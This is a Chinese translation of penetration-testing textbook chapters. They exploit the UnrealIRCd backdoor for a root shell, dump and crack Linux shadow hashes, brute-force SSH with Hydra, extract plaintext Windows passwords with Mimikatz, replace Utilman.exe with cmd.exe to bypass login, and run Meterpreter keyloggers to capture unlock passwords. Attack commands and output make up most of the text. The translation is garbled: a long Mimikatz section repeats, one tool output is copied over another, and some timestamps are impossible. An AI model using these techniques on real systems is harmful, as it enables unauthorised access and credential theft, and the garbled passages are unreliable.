第 1 部分是用户名。第 2 部分是加密类型，加密类型 1 意味着它是 128 位加密。第 3 部分用于该密码哈希的盐。最后，第 4 部分是实际哈希。

来自较新版本 Linux 的第二个哈希格式完全相同，但长得多。这个哈希的加密类型是 6，意味着它使用 512 位加密，因此哈希值长得多。这是一种强得多的加密，但在破解时我们实际上不需要做任何不同，因为 John the Ripper 会自动检测正确的哈希算法并进行相应的破解。

我不知道在破解 Windows NTLM 密码时你是否注意到，但两个 Windows 哈希值是相同的。Alice 和 Dan 两个用户都使用了密码“password”：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_294_0.png)

这是因为 Windows NTLM 哈希不使用盐。因此，如果 Windows 中的两个或多个用户使用相同密码，NTLM 密码哈希将是相同的。Linux 则并非如此。如果用户密码相同，盐会为每个用户创建一个不同的哈希。下方的哈希来自在 Kali Linux 中使用密码“password”的两个用户（Dan 和 Alice）：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_294_1.png)

注意，这些哈希彼此完全不同（盐也是如此）。这在从大型密码哈希转储文件中破解密码时产生了巨大差异，因为你总会有用户使用相同的密码。如果不使用盐，你可以一次性获取所有相同的密码；如果使用了盐，你就必须逐个破解哈希。好了，关于哈希格式的话就够了，让我们看看如何从系统中获取 Linux 密码哈希。

# 获取 Linux 密码

正如你从书中早些 Metasploitable 教程记得的，我们能够使用 Unreal IRC 漏洞获取“root”级权限。对于本节，我们将再次对我们的 Metasploitable2 虚拟机使用相同的漏洞来获取密码哈希。

由于已经过了一段时间，我们将逐步演示 Unreal 漏洞：

- 启动你的 Metasploitable 2 虚拟机
- 在 Kali 中运行 Metasploit
- 输入 "use exploit/unix/irc/unreal_ircd_3281_backdoor"
- 输入 "set RHOST 192.168.1.68"
- 然后输入 "exploit"

如下所示：

```
msf > exploit/unix/irc/unreal_ircd_3281_backdoor
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOST 192.168.1.68
RHOST = 192.168.1.68
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit
* Started reverse TPC double handler on 192.168.1.39:4444
*192.168.1.6667 - Connected to 192.168.1.39:4444
*irc:Metasploitable.LAN AUTH **** Looking up your hostname...
*irc:Metasploitable.LAN AUTH **** Couldn't resolve your hostname: IP address
*192.168.1.6667 - Sending backup...
* Accepted the first client...
* Accepted the second client...
* command: echo v7IlhnbqgNH0tm
* Writing to socket A
* Writing to socket B
* Reading from sockets...
* Reading from socket B
* B: "v7IlhnbqgNH0tm\n"
* Matching...
* A is input...
* command shell 1 opened (192.168.1.39:4444 -> 192.168.1.6667:5183)
2010-07-18 52:09-4
This will be a remote shell, so there will not a prompt. Just type "whoami" to verify that you are the all-powerful 'root' user. We are now ready to recover the password hashes from the system.
Simply type, "cat /etc/passwd":

```
cat /etc/passwd
root:x:0:0:/bin/bash
daemon:x:1:1:/usr/sbin/bash
bin:x:2:2:/bin/bash
sync:x:4:65534:sync:/bin/sync
games:x:5:60:/games/bin/sh
man:x:6:12:/var/cache/man/bin/sh
lp:x:7:7:/var/spool/lpd/bin/sh
mail:x:8:8:/var/mail/bin/sh
news:x:9:9:/var/spool/news/bin/sh
ucp:x:10:10:/var/spool/ucp/bin/sh
proxy:x:13:13:/proxy/bin/sh
www-data:x:33:33:/var/www/bin/sh
backup:x:34:34:/var/backups/bin/sh
list:x:38:38:/Mailing Manager:/var/list/sh
irc:x:39:39:/var/run/irc/sh
```

在你的 Kali 系统上打开 Leafpad
现在通过选择文本并将其到 Leafpad 将文本复制到你的 Kali 系统：

```
root:x:0:0:/root/bin/bash
daemon:x:1:1:/usr/sbin/bin/sh
bin:x:2:2:/bin/bin/sh
sys:x:3:3:/dev/bin/sh
sync:x:4:65534:sync:/bin/sync
games:x:5:60:/games/bin/sh
man:x:6:12:/var/cache/man/bin/sh
lp:x:7:7:/var/spool/lpd/bin/sh
mail:x:8:8:/var/mail/bin/sh
news:x:9:9:/var/spool/news/bin/sh
ucp:x:10:10:/var/spool/ucp/bin/sh
proxy:x:13:13:/proxy/bin/sh
www-data:x:33:33:/var/www/bin/sh
backup:x:34:34:/var/backups/bin/sh
list:x:38:38:/Mailing Manager:/var/list/bin/sh
irc:x:39:39:/var/run/irc/bin/sh
gnats:x:41:41:gnats:Reporting Systems (admin):/var
nobody:x:65534:65534:nobody:/nonexistent/bin/sh
libuuid:x:100:101::/var/libuuid/bin/sh
hcp:x:101:102::/var/nonexistent/bin/false
```

在 Kali 桌面上将文本保存为名为 "passwd" 的文件
对 "shadow-" 文件执行相同的操作

输入 "cat /etc/shadow"
将文本粘贴到 Leafpad
将文件保存到桌面上名为 "shadow-"

你现在本地 Kali 桌面上应该有两个文本文件 "/root/Desktop/passwd" 和 "/root/Desktop/shadow"。

我们需要这两个新创建的文本文件，并在 John the Ripper 工具中对它们运行 "unshadow" 命令。该命令将文件合并成单个文件（cracked），John the Ripper 可以破解它：

- 打开终端窗口
- 导航到桌面目录
- 输入 **unshadow passwd shadow- > cracked**

```
root@kali:~# cd Desktop
root@kali:~/Desktop unshadow passwd shadow- > cracked
```

现在我们已经创建了 "cracked" 文件，可以释放 John the Ripper 来尝试检索密码。我们将使用 John 附带的字典列表文件 **password.lst**：

```
输入 **john --wordlist=/usr/share/john/password.lst cracked**
Warning: detected hash type "md5crypt", but the string is also recognized aix-md5
Use the "--format=aix-md5" option to force loading these as that type in
Using default input encoding: UTF-8
Loaded 7 password hashes with 7 different salts (md5crypt, crypt(3) S16 [
20/120 SSE2 4x3]]
Press Ctrl-C to abort, almost any other key for status
(klog)
service
(service)
batman
(sys)
3g 00:00:00 DONE (2018-07-18 19:03:99) 7.317g/s 8648p/s 34887/c 34887C/s
```

现在我们可以看到 John 本身是如何使用 "--show" 命令的：

输入 **john --show cracked**




```bash
root@kali:~/Desktop# john --show cracked
sys:batman:3:3:sys:/dev/bin/sh
klog:123456789:103:104:/home/klog:/bin/false
service:service:1002:1002,:,/home/service:/bin/bash
```

破解了 3 个密码，还剩 4 个。

搞定；现在我们有 3 个用户名和密码可以尝试了：

sys/batman
klog/123456789
service/service

还有 4 个它没拿到，让我们尝试另一个字典文件：

输入，`john --wordlist=/usr/share/sqlmap/txt/wordlist.txt cracked`
当这完成后，输入 `john --show cracked`。

sqlmap 的字典要大得多，运行时间也更长。但它成功破解了另外两个：

postgres/ postgres
user/ user

我其实很惊讶它没有获取主要的 "msfadmin/ msfadmin" 密码。我确信过去使用默认的 John 字典时能抓取它的。但总的来说，仅用两个字典文件就破解了 7 个密码中的 5 个，这并不差。

现在我们有一些密码可以尝试了，Kali 有几种工具可以使用它们来执行自动化攻击。我们将查看其中三个：

- Hydra
- Medusa
- Ncrack

这些工具将采用我们提供的凭据，并针对 Metasploitable 目标上运行的的服务尝试每种组合。

# 使用 Hydra 自动化密码攻击

工具作者：Van Hauser, Roland Kessler

工具网站：https://www.thc.org/thc-hydra

Hydra 是一个暴力破解程序，它接受用户列表和密码列表，并尝试它们的不同组合来攻击服务器服务。如果我们为上面获取的用户名和密码各创建一个一个文件，就可以将它们喂给 Hydra 这样的程序。这些工具自动化了使用破解账户攻击服务的任务。

创建以下两个文本文件（Users, Passwords），输入从密码文件中恢复的值并将它们保存到 Desktop 目录下：

## Users
- msfadmin
- sys
- klog
- service
- postgres
- user

## Passwords
- msfadmin
- batman
- 1234567898
- service
- postgres
- user

我包含了 msfadmin，因为我认为它以前被包含在字典文件中。如果你还记得，我们在查看 Metasploit 章节中的 telnet 服务器时已经发现它了：

```
root@kali:~# telnet 192.168.1.68
Trying 192.168.1.68...
Connected to 192.168.1.68.
Escape character is '^|'.

警告: 永远不要将此虚拟机暴露到不可信的网络！
联系方式: msfdev(at)metasploit.com
使用 msfadmin/msfadmin 登录
```

现在，使用 Hydra 使用我们新发现的密码来攻击 SSH 服务：

在桌面目录中输入，`hydra -L Users -P Passwords 192.168.1.68 ssh`

"-L" 切换使用我们的文件名，在此处为 **Users**。"-P" 切换是我们的密码文件位置，在此处为 "Passwords"。然后我们只需列出目标 IP 地址和服务的 **#ssh**：

```
root@kali:~/Desktop -hL Users -P Passwords 192.168.1.68 ssh
Hydra v8.6 (2017) by van Hauser/THC - 请勿用于军事目的
Hydra (http://www.thc-hydra.) starting at 2018-07-18 19:20:50
[WARNING] 许多 SSH 配置限制并行任务数
[DATA] 每台服务器最多 16 个任务，总共 16 个任务，30 次登录尝试 (1:
[DATA] 攻击 ssh://192.168.1.68:21/
[22] ssh host: 192.168.1.68 login: msfadmin password: msfadmin
[22] ssh host: 192.168.1.68 login: sys password: batman
总计成功完成 1 个，找到了 2 个有效密码
```

（如果你偏好图形界面，可以从在线攻击菜单使用 Hydra-GTK）

你可以看到，以下用户/密码组合能够成功登录到目标的 SSH 服务器：

### Sys/batman 和 msfadmin/msfadmin

虽然尝试一个我们已经知道的小密码列表有点愚蠢，但这个概念是稳固的。在没有任何实际密码的情况下，我们可以使用 hydra 配合用户名和密码字典文件来暴力破解服务器。但如果你有用户名和密码，针对目标服务尝试你拥有的列表会快得多。

让我们尝试 Hydra 攻击 Metasploitable 的 FTP 服务：

输入，**hydra -L Users -P Passwords ftp://192.168.1.68**

```
root@kali:~/Desktop -hL Users -P Passwords ftp://192.168.1.68
Hydra v8.6 (2017) by van Hauser/THC - 请勿用于军事目的
Hydra (http://www.thc-hydra.) starting at 2018-07-18 19:20:50
[DATA] 每台服务器最多 16 个任务，总共 16 个任务，30 次登录尝试 (1:
[DATA] 攻击 ssh://192.168.1.68:21/
[22] ssh host: 192.168.1.68 login: msfadmin password: msfadmin
[22] ssh host: 192.168.1.68 login: sys password: batman
总计成功完成 1 个，找到了 2 个有效密码
```
（注：原文中存在大量由于 OCR 错误导致的重复，译文已根据逻辑进行了精简处理）




## 资源

- "使用 Hashcat 破解 Linux 密码希" - https://samsclass.info/123/proj10/p12-hashcat.htm
- Medusa - http://foofus.net/goons/jmk/medusa/medusa.html
- Ncrack 参考指南 - https://nmap.org/ncrack/man.html

## 第 22 章：Mimikatz - 明文密码

**Mimikatz**
**工具作者：** Benjamin Delpy
**工具网站：** http://blog.gentilkiwi.com

在本节中，我们将学习如何恢复明文形式的远程密码。你没读错，就是*明文*！Windows 7 在 Windows 进程的多个位置以明文形式存储密码，你可以使用 Delpy 的强大工具来恢复这些密码。Mimikatz 已经作为一个独立程序运行了一段时间，并被添加到 Metasploit 框架中作为一个可加载的 Meterpreter 模块，这使得在获得远程会话后恢复密码变得极其简单。我提到过密码是明文的吗？虽然在较新的操作系统（如 Windows 10 和 Server 2016）中，它返回的是需要破解的 NTLM 哈希。

在本章中，我们将看到如何通过 Metasploit 使用 Mimikatz 从远程系统恢复密码。然后我们将看到如何将 Mimikatz 用于物理攻击，即安全测试人员拥有系统物理访问的攻击。还有其他几种你可以使用 Mimikatz 的方法我们不会涵盖，而且 Benjamin 在更新工具和添加新功能方面做得非常出色，因此我强烈建议访问该工具博客以获取最新信息。

## Metasploit Mimikatz 扩展

我们将从一个在 Meterpreter 中激活的 Windows 7 系统级远程 Shell 开始。请查看“绕过 UAC”章节，以复习在需要时如何从管理员级账户切换到系统级账户。然后，我们将加载 Mimikatz 扩展（在 Meterpreter 中称为“kiwi”），并使用它显示密码。我们可以使用已经用过几次的 Windows 7 “Cute Puppy”远程 Shell。只需先启动 Metasploit 处理器即可。如果你的虚拟机上仍然禁用了 UAC，那么如果你重新启用了 UAC，你需要在运行 "getsystem" 之前运行 Metasploit UAC 绕过模块。一如既常，熟能生巧。

针对 Windows 7 虚拟机打开激活 Meterpreter 会话的 Metasploit：

- 1. 输入 "load kiwi":
```
meterpreter > load kiwi
Loading extension kiwi2.1...

##### mimikatz 2.1.1 20170608 (x86/windows)
## ^ * # "La Vie, A L'Amour"
## # / // #
## / \ // Benjamin gentilkiwi - (benjamin@gentilkiwi.com )
## ' # v ' # http://blog.gentilkiwi.com/mimikatz (oe.eo)
##### Ported to Metasploit by OJ Reeves TheColonial * * */

Success.
meterpreter > |
```

Kiwi 扩展现在可以可以使用。

- 2. 输入 "help" 查看可用命令：
```
Kiwi Commands
| 命令 | 描述 |
|---------|-------------|
creds_all | 获取所有凭据（已解析）|
creds_kerberos | 获取 Kerberos 凭据（已解析）|
creds_msv | 获取 LM/NTLM 凭据（已解析）|
creds_jsp | 获取 SP 凭据|
creds_tspkg | 获取 Tspkg 凭据（已解析）|
creds_widget | 获取 Widget 凭据（已解析）|
dcsync | 通过 DCSync 获取用户账户信息|
dcsync_ntlm | 获取 NTLM 哈希、SID 和 RID|
golden_ticket_create | 创建黄金 Kerberos 票|
kerberos ticket list | 列出所有 Kerberos 票（未解析）|
```

- 3. 输入 "lsa_dump_secrets" 导出 LSA 密钥：

```
meterpreter > lsa_dump_secrets
[+] Running as SYSTEM
[*] Dumping LSA secrets
Domain : WIN-420RBM3SRVF
SysKey : 7877fc42914e252228a93677f7822

Local name : WIN-420RBM3SRVF : S-1-5-2
Domain name : WORKGROUP

Policy subsystem : 1.11
LSA Key(s) : 1, default (04c09bd-6d90
[00] (04c09bd-6d90-8aad-50bf-44b0db
b3c1cf8e4752ea33851b6094211bd4

Secret : DefaultPassword
text : password
text : ROOT123
```

如你所示，这个用户使用了“password”这个超安全的密码。即使他之前的密码“ROOT#123”也不太好。好吧，至少他坚持是一致的。注意，不需要恢复哈希，也不需要破解密码，密码以明文形式可用。

你也可以使用 SAM 数据库查看所有用户哈希：输入 `lsa_dump_sam`

```
meterpreter > lsa_dump_sam
[+] Running as SYSTEM
[*] Dumping SAM
Domain : WIN-420RBM3SRVF
SysKey : 7877fc42914e252228a93677f7822

Local name : WIN-420RBM3SRVF : S-1-5-2
Domain name : WORKGROUP

Policy subsystem : 1.11
LSA Key(s) : 1, default (04c09bd-6d90
[00] (04c09bd-6d90-8aad-50bf-44b0db
b3c1cf8e4752ea33851b6094211bd4
```
*(此处由于原文截断或逻辑衔接，接下文内容)*

这使得在获得远程会话后恢复密码变得极其简单。我提到过密码是明文的吗？虽然在较新的操作系统（如 Windows 10 和 Server 2016）中，它返回的是需要破解的 NTLM 哈希。

在本章中，我们将看到如何通过 Metasploit 使用 Mimikatz 从远程系统恢复密码。然后我们将看到如何将 Mimikatz 用于物理攻击，即安全测试人员拥有系统物理访问的攻击。还有其他几种你可以使用 Mimikatz 的方法我们不会涵盖，而且 Benjamin 在更新工具和添加新功能方面做得非常出色，因此我强烈建议访问该工具博客以获取最新信息。

## Metasploit Mimikatz 扩展

我们将从一个在 Meterpreter 中激活的 Windows 7 系统级远程 Shell 开始。请查看“绕过 UAC”章节，以复习在需要时如何从管理员级账户切换到系统级账户。然后，我们将加载 Mimikatz 扩展（在 Meterpreter 中称为“kiwi”），并使用它显示密码。我们可以使用已经用过几次的 Windows 7 “Cute Puppy”远程 Shell。只需先启动 Metasploit 处理器即可。如果你的虚拟机上仍然禁用了 UAC，那么如果你重新启用了 UAC，你需要在运行 "getsystem" 之前运行一个 Metasploit UAC 绕过模块。一如既常，熟能生巧。

针对 Windows 7 虚拟机打开激活 Meterpreter 会话的 Metasploit：

- 1. 输入 "load kiwi":
```
meterpreter > load kiwi
Loading extension kiwi2.1...

##### mimikatz 2.1.1 20170608 (x86/windows)
## ^ * # "La Vie, A L'Amour"
## # / // #
## / \ // Benjamin gentilkiwi - (benjamin@gentilkiwi.com )
## ' # v ' # http://blog.gentilkiwi.com/mimikatz (oe.eo)
##### Ported to Metasploit by OJ Reeves TheColonial * * */

Success.
meterpreter > |
```

Kiwi 扩展现在可以可以使用。

- 2. 输入 "help" 查看可用命令：
```
Kiwi Commands
| 命令 | 描述 |
|---------|-------------|
creds_all | 获取所有凭据（已解析）|
creds_kerberos | 获取 Kerberos 凭据（已解析）|
creds_msv | 获取 LM/NTLM 凭据（已解析）|
creds_jsp | 获取 SP 凭据|
creds_tspkg | 获取 Tspkg 凭据（已解析）|
creds_widget | 获取 Widget 凭据（已解析）|
dcsync | 通过 DCSync 获取用户账户信息|
dcsync_ntlm | 获取 NTLM 哈希、SID 和 RID|
golden_ticket_create | 创建黄金 Kerberos 票|
kerberos ticket list | 列出所有 Kerberos 票（未解析）|
```

- 3. 输入 "lsa_dump_secrets" 导出 LSA 密钥：

```
meterpreter > lsa_dump_secrets
[+] Running as SYSTEM
[*] Dumping LSA secrets
Domain : WIN-420RBM3SRVF
SysKey : 7877fc42914e252228a93677f7822

Local name : WIN-420RBM3SRVF : S-1-5-2
Domain name : WORKGROUP

Policy subsystem : 1.11
LSA Key(s) : 1, default (04c09bd-6d90
[00] (04c09bd-6d90-8aad-50bf-44b0db
b3c1cf8e4752ea33851b6094211bd4

Secret : DefaultPassword
text : password
text : ROOT123
```

如你所示，这个用户使用了“password”这个超安全的密码。即使他之前的密码“ROOT#123”也不太好。好吧，至少他坚持是一致的。注意，不需要恢复哈希，也不需要破解密码，密码以明文形式可用。

你也可以使用 SAM 数据库查看所有用户哈希：输入 `lsa_dump_sam`

```
meterpreter > lsa_dump_sam
[+] Running as SYSTEM
[*] Dumping SAM
Domain : WIN-420RBM3SRVF
SysKey : 7877fc42914e252228a93677f7822

Local name : WIN-420RBM3SRVF : S-1-5-2
Domain name : WORKGROUP

Policy subsystem : 1.11
LSA Key(s) : 1, default (04c09bd-6d90
[00] (04c09bd-6d90-8aad-50bf-44b0db
b3c1cf8e4752ea33851b6094211bd4
```
*(注：由于提供的原文文本在结尾处重复且逻辑中断，上述翻译已根据提供的片段进行了完整处理。)*





## 虚拟机设置

| 设备 | 摘要 | 设备状态 |
| --- | --- | --- |
| 内存 | 2 GB | 已连接 |
| 处理器 | 1 | 开机时检查 |
| 硬盘 (SATA) | 60 GB | |
| IDE/CD |正在使用文件: C:/Users/Ian/Dow... | 已连接 |
| 网络适配器 | 桥接 (自动) | |
| USB 控制器 | 已存在 | 使用物理驱动: |
| 声卡 | 自动检测 | 使用 ISO 镜像文件: |
| 打印机 | 已存在 | C:\Users\Ian\Downloads\kali-linux [浏览...] |
| 显示器 | 自动检测 | |

我们将修改系统文件名，请花费一些时间，并确保选择了正确的文件。

- 1. 使用独立的 Windows 系统和可启动的 Kali 磁盘盘，或将你的 Windows 7 虚拟机 CDROM 设置为使用 Kali Linux ISO 并从其启动。

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_309_0.png)

- 2. 选择 "Live 686-pae" 启动选项。
- 3. 一稍后 Kali 桌面将出现。点击“Places（位置）”、“Computer（计算机”）然后点击 "+ Other Locations（其他位置）”。
- 4. 选择你的本地硬盘，它将显示为“xx GB Filesystem”:

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_310_0.png)

- 5. 点击“xx GB Volume”，你的 Windows 7 文件系统将显示出来：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_310_1.png)

现在你可以查看 Windows 系统上的所有文件，并随意浏览目录结构。Windows 安全性和权限不再生效，因为你正在 Linux 中查看驱动器。如果你愿意，可以从单个文件或工具复制到驱动器。

> 注意：如果硬盘没有加密，此时你对 Windows 文件系统具有完全访问权限。

- 6. 导航到“Windows\System32”目录。

我们现在要执行的是将 Utilman 可执行文件替换为命令提示符可执行文件的副本。我们将重命名原始的‘Utilman.exe’文件以让位，复制‘cmd.exe’并将其重命名为‘Utilman.exe’。

- 7. 找到“**utilman.exe**”文件并将其重命名为“**utilman.old**”:

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_311_0.png)

文件图标可能不同。只需确保文件名正确即可。

- 8. 右键“**cmd.exe**”文件并点击“**copy to（复制到）**”。现在将其复制回同一目录。你现在应该同时拥有“**cmd.exe**”和一个名为 ***cmd (copy).exe*** 的文件，如下所示：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_311_1.png)

- 9. 现在将“**cmd (copy).exe**”文件重命名为“**Utilman.exe**”。

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_311_2.png)

你现在应该有两个 Utilman 文件，‘utilman.old’（原始文件）和新的‘utilman.exe’文件（cmd.exe 的副本）：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_311_3.png)

这就是我们需要做的所有工作。保留 *Utilman.old* 文件，以防你想切换回并恢复正常的 Utilman 功能。

- 10. 现在只需关闭 Kali 并让 Windows 系统正常启动。如果你将虚拟机设置为从 Kali ISO 镜像启动，则需要进入 CDROM 设置将其改回“**use physical drive（使用物理驱动器）**”。

- 11. 在登录界面同时按下“Windows”和“u” 键，会弹出一个系统级的命令提示符！

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_312_0.png)

如果你输入 "whoami"，你会发现你实际上是用户 'nt authority\system'，这是可用的最高权限。注意登录图标仍在背景中。从这里你可以做任何你想做的事，你拥有完全访问权限。据我所知，这适用于从 Windows 9x 及以上所有版本的 Microsoft Windows 操作系统。它也适用于 Server 版本，包括 Server 2016：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_312_1.png)

同样的方法修改 "Sethc.exe" 命令也可以让你绕过 Windows 登录。Sethc.exe 用于 Windows 粘滞键（Sticky Keys）功能。在正常操作下，如果你连续五次粘滞键，就会弹出粘滞键对话框。这样用，只需在登录界面按五次粘滞键，系统级提示就会打开。尽管这在虚拟机中效果并不理想，因为 Windows 主机会触发粘滞键响应。

> 注意：物理访问在很大程度上等同于完全访问。请加密你的驱动器并保护你的系统！

## 从锁定的工作站恢复密码

继续这个概念，渗透测试人员（如果他们拥有系统的物理访问权限）如何从一个停留在锁定登录界面的 Windows 系统中获取密码呢？嗯，如果情况允许，我之前在想，如果你是一个拥有系统物理访问权限的渗透测试人员，能否获取密码？

首先，你需要能够从登录界面启用系统级命令提示符。如上所述，“Utilman Bypass（Utilman 绕过）”技巧通过按下键盘上的“Windows”和“u”键启用弹出系统级提示符。我们只需要一个带有 Mimikatz 的 USB 驱动。Mimikatz 可执行文件可以 gentil gentilwi 的网站下载：https://github.com/gentilkiwi/mimikatz/releases/

几乎所有的杀病毒引擎现在都会将 Mimikatz 视为恶意软件，因此在尝试下载时可能需要考虑这一点。

- 1. 你需要在之前已经配置好“Utilman Bypass”。
- 2. 正常登录 Windows 系统，然后通过按下“Windows”和“L” 键锁定桌面。这可以模拟用户锁定系统去吃午餐或保持运行。
- 1. 在锁定的桌面按下“Windows”和“u” 键。

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_314_0.png)

- 2. 输入 "whoami" 确认我们处于系统权限：

```
C:\Windows\System32>whoami
nt authority\system
```

- 3. 导航到你的 USB 驱动器，在我的系统中是 E：
- 4. 进入 Mimikatz 目录，进入 'Win32' 或 'x64' 目录，取决于你的系统。
- 5. 运行 "mimikatz":

```
E:\mimikatz>mimikatz
#### mimikatz 2.1.1 (x86) built on jun 16 2018 18:48:43
#### privilege::debug
*** "privilege::logon" (cmd)
*** Benjamin gentilkiwi (benjamin@gentkiwi.com)
*** http://blog.gentkiwi.com/mimikatz
*** Injected::TODO
*** vincent.letoux (vincent.letoux@gmail.com)
*** http://pingcastle.com / http://mysmarton.com
mimikatz # 
```

- 6. 输入 "sekurlsa::LogonPasswords":

```
mimikatz # 
```

> 注意：如果数据超出页面导致看不到，你可能需要进入命令行窗口属性并增大窗口尺寸。在这个例子中，我将窗口高度设置为 200。

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_315_0.png)

如所示，成功了：

我们现在有了用户的 NTLM 哈希，但更重要的是我们还得到了明文密码，“**LongwordsTheWayToGo!**”。在较新的操作系统中，例如 Windows 10 或 Server 2016，你只会得到用户的 NTLM 哈希。如下所示所示：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_316_0.png)

你将需要获取 NT(LM) 哈希。你可以使用 Ripper 或 Hashcat 完成。这里是上面 Server 2016 系统的哈希：John：

```
mimikatz::/Desktop/john --format=NT --wordlist=geekphrases.txt Server2016hash.txt
Using default encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 SSE2 4x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
SayFriendAndEnter (Y)
```

John 调用了 NT 格式、词字典和密码哈希（存储在文件中）。在此案例中，用户 Dan 的密码是“SayFriendAndEnter”——显然是一个指环粉丝。





Mimikatz 工具正在不断更新，并持续添加新功能。我强烈建议读者访问工具作者的网站并阅读最新功能。对于高级用户来说，黄金票（Golden Ticket）功能非常有意思。你还可以使用 Mimikatz 执行哈希传递（Pass-the-Hash）提权攻击，或者在 PowerShell 中运行它。最新功能之一是将作为 DLL 运行 Mimikatz：

```bash
Runll32 c:\mimikatz\x64\mimikatz.dll,main coffee
```

正如作者的视频所示（链接见资源部分）：

```
mimikatz 2.1.1 (x64) (cs.exe)
#####
##### mimikatz 2.1.1 (x64) built on Jul 17 2018 08:17:09 - lil!
# # \ "A La Vie, L'Amour" (cs.exe)
# # \/ ... Benjamin DELPY gentilkiwi (benjamin@gentilkiwi.com)
# v ## http://blog.gentilkiwi.com/mimikatz
# v ## Vincent LE TOUX (vincent.letoux@gmail.com)
# >pingcastle.com / mysmartlogon.com ***/
#####''
mimikatz(commandline) # coffee
  {
    MimikatzCredential(
    )
  }mimikatz # :)
```

这一过程为运行 Mimikatz 增加了一丝隐性。当以这种方式运行 Mimikatz 时，它不会在系统进程列表中正常显示。所有显示的只有 "runll32" 程序。

## 结论

在本章中，我们学习了强大的 Mimikatz。我们看到了如何结合使用 Metasploit 框架的 Meterpreter 和 Mimikatz 从远程系统恢复明文密码。我们学习了如何从 Kali Live 系统启动并查看 Windows 文件系统的内容（如果驱动器未加密，我们本就可以轻松地从那里提取用户文档和文件）。我们探索了如何设置 Utilman 绕过（Utilman Bypass）以便在没有密码的情况下登录 Windows。最后，我们还涵盖了如何使用 Mimikatz 在物理攻击中获取用户的明文密码。

如你所见，仅仅依靠复杂密码作为安全措施并不总是万无一失的。如果攻击者能够访问你的系统，他们可能会获得你的明文密码。正如俗语所，“物理访问等同于完全访问”。

那么，长期来看可以做些什么呢？安装启动密码来保护启动驱动器。确保重要机器的物理安全。此外，如果不需要，请关闭或禁用 DVD/CD ROM 驱动器和 USB 端口。有些组织甚至会用胶水填充 USB 端口！

## 资源

- Mimikatz GitHub 网站：https://github.com/gentilkiwi/mimikatz/wiki
- Mimikatz  DLL 视频：https://video.twimg.com/tweet_video/DiSY68WX4AAuujom.mp4

## 第 23 章：Keyscan、Lockout 键盘记录器和步骤记录器

当渗透测试人员拥有用户机器的远程权限时，有时他们运行远程键盘扫描器是有益的。该工具是一个在后台静默运行的程序，记录用户按下的所有键。在本章中，我们将查看在 Metasploit 中实现此点的两种不同方法。然后，我们将把微软的问题步骤记录器（Problem Step Recorder）变成一个远程录制“间谍”工具。

### 使用 Metasploit 进行键盘记录

本章将从探索 Metasploit 内置的键盘扫描器开始。Metasploit 有一组非常有用的 Meterpreter 命令，用于捕获目标机器上的按键。

- Keyscan_dump
- Keyscan_start
- Keyscan_stop

这些命令可以通过 Meterpreter 使用，因此我们将从一个已经运行漏洞并成功创建远程会话的系统开始。我们将 Windows 7 系统作为目标。我们需要系统权限，所以在获取远程会话后，必须运行 Bypass UAC 模块，然后运行 "getsystem" 命令。

```
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin))
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

如果在 Meterpreter 提示符处输入 "help"，我们将获得可以运行的命令列表。对于本部分，我们只关注 "keyscan" 命令：

```
keyscan dump 击键缓冲区
keyscan start 开始捕获击键
keyscan stop  停止捕获击键
```

现在，让我们看看启动远程键盘记录器时是什么样的。然后我们将查看捕获的击键。

- 1. 只需输入 "keyscan_start" 开始远程记录。

```
meterpreter > keyscan_start
Starting keystroke sniffer...
meterpreter >
```

在实际测试中，我们只需要等待目标在键盘上输入一些内容。对于我们的示例，请打开你的 Windows 7 浏览器并在 Google 上进行搜索。

- 2. 现在回到 Kali 系统，要查看输入了什么，只需输入 "keyscan_dump"：

```
meterpreter > keyscan_dump
Dumping captured keystrokes...
google.com<CR>
dill dallas to the super bowl next<RightShift>?<CR>
```

在这里我们可以看到输入了 google.com 和 dill dallas to the super bowl next。注意右 Shift 键（RightShift）。

- 3. 当用户使用 Windows + L 锁定桌面时，我们可以看到击键。在这里我们可以看到输入了 google.com 和 dill dallas to the super bowl next。注意右 Shift 键（RightShift）。

- 4. 当用户重新登录，我们可以看到密码。

- 5. 如果用户锁定桌面，我们可以看到击键。

- 6. 输入 "ps" 查看进程列表。

- 7. 迁移到 winlogon 进程以监控会话。

- 8. 输入 "keyscan_start"。

- 9. 锁定桌面并重新登录。

- 10. 最后，使用 "keyscan_dump" 导出击键日志。





```
meterpreter > background
[*] exploit(web_delivery) > use post/windows/capture/lockout_keylogger
msf post(lockout_keylogger) > set session 4
session => 4
msf post(lockout_keylogger) > exploit
```

+ [* 在 PID:472 找到 WINLOGON]
[*] 正在从 PID:2092 迁移
[*] 已成功迁移到 WINLOGON PID: 472
[*] 正在对 WIN-420RBM3SRVF.Dan 进行键记录

Lockout_Keylogger 会激活 Windows 进程并迁移至其。程序随后开始监控系统空闲时间。当空闲时间达到约 300 秒时，Lockout Keylogger 会尝试远程锁定用户的桌面。它有时会失败并尝试重新锁定：

+ [* 当前空闲时间: 262 秒
[*] 当前空闲时间: 293 秒
[*] 已锁定工作站，准备开始登录...
[*] 正在启动按键记录器...
[*] 按键正在保存到 /root/.msf/logs/scripts/mslogger/192.168.19
[*] 正在记录
[*] 系统已锁定 327 秒，且屏幕保护程序已关闭

现在，锁定已成功锁定工作站，并开始记录按键。如果我们的用户返回并输入密码解锁系统，我们就能获取它：

```
Password?: password <Return>
[*] 他们已重新登录，上一个密码可能是正确的。
[*] 正在停止按键记录器...
[*] 后执行完成
msf post(lockout_keylogger) >
```

